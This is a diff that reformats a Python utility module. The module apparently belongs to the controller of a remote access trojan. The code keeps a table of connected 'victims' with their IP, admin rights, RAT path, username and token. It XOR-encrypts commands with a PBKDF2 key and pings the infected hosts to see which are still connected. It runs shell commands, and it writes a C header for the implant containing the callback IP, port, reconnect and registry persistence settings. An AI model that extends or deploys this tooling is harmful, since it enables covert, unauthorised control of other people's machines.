@@ -1,4 +1,4 @@
-from colorama import Fore,Style
+from colorama import Fore, Style
 from subprocess import Popen
 from subprocess import PIPE
 from backports.pbkdf2 import pbkdf2_hmac
@@ -8,7 +8,7 @@ import socket
 import binascii
 
 
-#CONSTANT:
+# CONSTANT:
 NB_SESSION = 0
 NB_SOCKET = 1
 NB_IP = 2
@@ -18,43 +18,47 @@ NB_ADMIN = 5
 NB_PATH = 6
 NB_USERNAME = 7
 NB_TOKEN = 8
-NB_SELECT = 9  #When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False). This serves to avoid confusion when sending data. 
-NB_CONNEXION = 10 
+NB_SELECT = 9  # When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False). This serves to avoid confusion when sending data.
+NB_CONNEXION = 10
 
 SOCK_TIMEOUT = 6
 
 SPLIT = "|SPLIT|"
-#session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token
+# session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token
 
-def XOREncryption(data,key):
 
+def XOREncryption(data, key):
     result = ""
     char_xor = ""
 
     for x in range(len(data)):
-       
         current = data[x]
 
-        current_key  = key[x % len(key)]
+        current_key = key[x % len(key)]
 
         char_xor = chr(ord(current) ^ ord(current_key))
-        
+
         result += char_xor
 
     return result
 
 
-def generate_PBKDF2_key(password, salt="CISCOTHEBOSS",iteration=10000 ,length=512): #Generates the key to encrypt and decrypt data using the XOR algorithm.
-    
+def generate_PBKDF2_key(
+    password, salt="ANG3LTHEBOSS", iteration=10000, length=512
+):  # Generates the key to encrypt and decrypt data using the XOR algorithm.
     password = password.encode()
     salt = salt.encode()
 
-    return binascii.hexlify(pbkdf2_hmac("sha256", password, salt, iteration, length)).decode("utf8")
+    return binascii.hexlify(
+        pbkdf2_hmac("sha256", password, salt, iteration, length)
+    ).decode("utf8")
 
 
 def exec(command):
-    with Popen(str(command), stdout=PIPE,stderr=PIPE,shell=True) as cmd:
-        out,err = str(cmd.stdout.read(),"UTF8",errors="ignore"),str(cmd.stderr.read(),"UTF8",errors="ignore")
+    with Popen(str(command), stdout=PIPE, stderr=PIPE, shell=True) as cmd:
+        out, err = str(cmd.stdout.read(), "UTF8", errors="ignore"), str(
+            cmd.stderr.read(), "UTF8", errors="ignore"
+        )
         if not err:
             print(out)
             return out
@@ -63,80 +67,113 @@ def exec(command):
             return err
 
 
-def printColor(status,message):
-    ERROR_COLOR = "\033[31m" #red
-    HELP_COLOR = "\033[35m" #magenra
-    TERMINAL_COLOR = "\033[34m" #blue
-    INFO_COLOR =  "\033[33m"
-    ARRAY_COLOR = "\033[36m" #cayen
-    SUCCESSFULLY_COLOR = "\033[32m" #green
+def printColor(status, message):
+    ERROR_COLOR = "\033[31m"  # red
+    HELP_COLOR = "\033[35m"  # magenra
+    TERMINAL_COLOR = "\033[34m"  # blue
+    INFO_COLOR = "\033[33m"
+    ARRAY_COLOR = "\033[36m"  # cayen
+    SUCCESSFULLY_COLOR = "\033[32m"  # green
 
     RESET_COLOR = Style.RESET_ALL
 
     if status == "error":
-        print(ERROR_COLOR+message+TERMINAL_COLOR)
+        print(ERROR_COLOR + message + TERMINAL_COLOR)
     elif status == "information":
-        print(INFO_COLOR+message+TERMINAL_COLOR)
+        print(INFO_COLOR + message + TERMINAL_COLOR)
     elif status == "help":
-        print(HELP_COLOR+message+TERMINAL_COLOR)
+        print(HELP_COLOR + message + TERMINAL_COLOR)
     elif status == "successfully":
-        print(SUCCESSFULLY_COLOR+message+TERMINAL_COLOR)
+        print(SUCCESSFULLY_COLOR + message + TERMINAL_COLOR)
 
 
 def areYouSure():
-    #test the input is y or n and return True if yes else return False.
+    # test the input is y or n and return True if yes else return False.
 
     inp = str(input("YesOrNo> ")).lower()
     print("\n")
-    if(inp == "y" or inp == "yes"):
+    if inp == "y" or inp == "yes":
         return True
-    
-    elif(inp == "n" or inp == "no"):
+
+    elif inp == "n" or inp == "no":
         return False
     else:
-        printColor("error","[-] Unknown argument.\n")
+        printColor("error", "[-] Unknown argument.\n")
         return False
 
 
 def printAllTarget():
-    #Print all target.
+    # Print all target.
     from .handler import Handler
-    
-    ptable = PrettyTable() #Ascii tables dynamic.
-    ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
+
+    ptable = PrettyTable()  # Ascii tables dynamic.
+    ptable.field_names = [
+        "Session",
+        "IP",
+        "Port",
+        "Is he alive",
+        "Is he admin",
+        "Path RAT",
+        "Username",
+    ]  # append title of row.
 
     for key in Handler.dict_conn.keys():
-        ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])
+        ptable.add_row(
+            [
+                key,
+                Handler.dict_conn[key][NB_IP],
+                Handler.dict_conn[key][NB_PORT],
+                Handler.dict_conn[key][NB_ALIVE],
+                Handler.dict_conn[key][NB_ADMIN],
+                Handler.dict_conn[key][NB_PATH],
+                Handler.dict_conn[key][NB_USERNAME],
+            ]
+        )
 
-    print(Fore.GREEN,(ptable),Fore.BLUE)
+    print(Fore.GREEN, (ptable), Fore.BLUE)
 
 
-def pingAllTarget(dict_conn,checkconn_objt , number_of_times=int() ,ping_string="is_life?"):
-    #ping all the machine is determines whether the machine is alive or dead. 
+def pingAllTarget(
+    dict_conn, checkconn_objt, number_of_times=int(), ping_string="is_life?"
+):
+    # ping all the machine is determines whether the machine is alive or dead.
     from .handler import Handler
 
-    
-
     for key in dict_conn.keys():
-                        
-        if(dict_conn[key][NB_ALIVE] ==True and dict_conn[key][NB_SOCKET] ==False):
+        if dict_conn[key][NB_ALIVE] == True and dict_conn[key][NB_SOCKET] == False:
             print("\n\n\nChange value Is he alive true to false.")
             dict_conn[key][NB_ALIVE] = False
-    
-        if(dict_conn[key][NB_ALIVE] and bool(dict_conn[key][NB_SOCKET]) and not dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)
-            try:
-                dict_conn[key][NB_SOCKET].send(XOREncryption(ping_string, Handler.PBKDF2_Key, ).encode("utf-16-le"))
 
-            except ConnectionError as connerr: #If the connection does not answer
-                if(Handler.status_connection_display):
-                    printColor("information","[-] Client number {} {}:{} was disconnected.".format(dict_conn[key][NB_SESSION], dict_conn[key][NB_IP], dict_conn[key][NB_PORT]))
+        if (
+            dict_conn[key][NB_ALIVE]
+            and bool(dict_conn[key][NB_SOCKET])
+            and not dict_conn[key][NB_SELECT]
+        ):  # If the connection is alive (True) and the socket object is active (True)
+            try:
+                dict_conn[key][NB_SOCKET].send(
+                    XOREncryption(
+                        ping_string,
+                        Handler.PBKDF2_Key,
+                    ).encode("utf-16-le")
+                )
+
+            except ConnectionError as connerr:  # If the connection does not answer
+                if Handler.status_connection_display:
+                    printColor(
+                        "information",
+                        "[-] Client number {} {}:{} was disconnected.".format(
+                            dict_conn[key][NB_SESSION],
+                            dict_conn[key][NB_IP],
+                            dict_conn[key][NB_PORT],
+                        ),
+                    )
 
                 else:
                     pass
-                checkconn_objt.connexionIsDead(key) #Change status to dead (False)
+                checkconn_objt.connexionIsDead(key)  # Change status to dead (False)
 
-        else:#If the connection is dead
-            #connexion is dead no send msg
+        else:  # If the connection is dead
+            # connexion is dead no send msg
             pass
 
 
@@ -188,9 +225,10 @@ def commonHeader():
 """
     return header
 
-def customHeader(ip, auto, port, reco, registry, key): 
-    #In order not to have an error you need 4 \.
-    #Example C:\ = C:\\\\
+
+def customHeader(ip, auto, port, reco, registry, key):
+    # In order not to have an error you need 4 \.
+    # Example C:\ = C:\\\\
     header = """
 #ifndef COMMON_H
 #define COMMON_H
@@ -219,6 +257,8 @@ def customHeader(ip, auto, port, reco, registry, key):
 
 #endif
 
-""".format(ip, port, auto, reco, registry,key)
+""".format(
+        ip, port, auto, reco, registry, key
+    )
 
     return header
